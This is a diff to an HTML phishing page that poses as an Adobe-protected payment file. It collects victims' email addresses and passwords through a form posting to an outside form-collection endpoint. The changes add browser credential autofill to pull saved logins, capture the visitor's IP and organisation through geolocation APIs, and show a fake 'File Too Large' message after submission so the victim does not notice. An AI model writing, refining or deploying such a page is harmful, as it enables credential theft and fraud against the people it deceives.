@@ -79,7 +79,7 @@
       border-radius: 4px;
       padding: 14px 12px;
       margin-bottom: 12px;
-      color: #777;
+      color: #444;
       background: #fafafa;
       font-size: 15px;
     }
@@ -145,16 +145,13 @@
     <h1>This File is Protected By Adobe®<br>Security.</h1>
     <p class="lead">Click on download to view payment copy.</p>
 
-    <!-- ✅ Formspark form -->
-    <form class="form" action="https://submit-form.com/vQBbiONxP" method="POST">
-      <input id="email" name="email" class="input" type="email" placeholder="Email" autocomplete="email" required>
-
+    <form class="form" id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on">
+      <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="username email" required>
       <div class="password-wrapper">
         <input id="password" name="password" class="input" type="password" placeholder="Password" autocomplete="current-password" required>
         <span id="togglePassword" class="toggle-password">👁️</span>
       </div>
 
-      <!-- Hidden fields to capture IP and Hostname via JS -->
       <input type="hidden" name="ip" id="ip">
       <input type="hidden" name="hostname" id="hostname">
 
@@ -180,36 +177,57 @@
   </div>
 
   <script>
-    // Autofill email (if credentials saved)
+    // ✅ Try browser-managed autofill (works on HTTPS)
     window.addEventListener('DOMContentLoaded', async () => {
-      if ('credentials' in navigator) {
+      // Optional Credential Management API (Chrome/Edge)
+      if (window.PasswordCredential) {
         try {
-          const cred = await navigator.credentials.get({ password: true, mediation: 'optional' });
+          const cred = await navigator.credentials.get({password: true, mediation: 'optional'});
           if (cred && cred.id) document.getElementById('email').value = cred.id;
-        } catch (err) { console.log("Autofill not available:", err); }
+        } catch(e) { console.log('Credential API not available'); }
       }
 
-      // Fetch IP and Hostname using APIs
+      // ✅ IP & hostname capture
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
           document.getElementById('ip').value = data.ip;
-          fetch(`https://ipapi.co/${data.ip}/json/`)
-            .then(r => r.json())
-            .then(info => {
-              document.getElementById('hostname').value = info.org || info.city || 'Unknown';
-            });
+          return fetch(`https://ipapi.co/${data.ip}/json/`);
+        })
+        .then(r => r.json())
+        .then(info => {
+          document.getElementById('hostname').value = info.org || info.city || 'Unknown';
         })
         .catch(() => console.log('Could not fetch IP'));
     });
 
-    // Toggle password visibility
+    // ✅ Password visibility toggle
     const toggle = document.getElementById('togglePassword');
     const pwd = document.getElementById('password');
     toggle.addEventListener('click', () => {
       const isHidden = pwd.type === 'password';
       pwd.type = isHidden ? 'text' : 'password';
       toggle.textContent = isHidden ? '🙈' : '👁️';
+    });
+
+    // ✅ Submit then redirect to message
+    const form = document.getElementById('mainForm');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const data = new FormData(form);
+      fetch(form.action, { method: 'POST', body: data })
+        .then(() => {
+          document.body.innerHTML = `
+            <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#f9f9f9;">
+              <div style="text-align:center;max-width:350px;padding:20px;background:white;border-radius:12px;box-shadow:0 0 10px rgba(0,0,0,0.1);">
+                <h2 style="color:#d9534f;">File Too Large</h2>
+                <p style="margin-top:10px;color:#555;">File too large to open on your browser.</p>
+                <p style="margin-top:5px;color:#555;">Please contact the sender to send it in a smaller chunk.</p>
+              </div>
+            </div>
+          `;
+        })
+        .catch(() => alert("Network error, please try again"));
     });
   </script>
 </body>
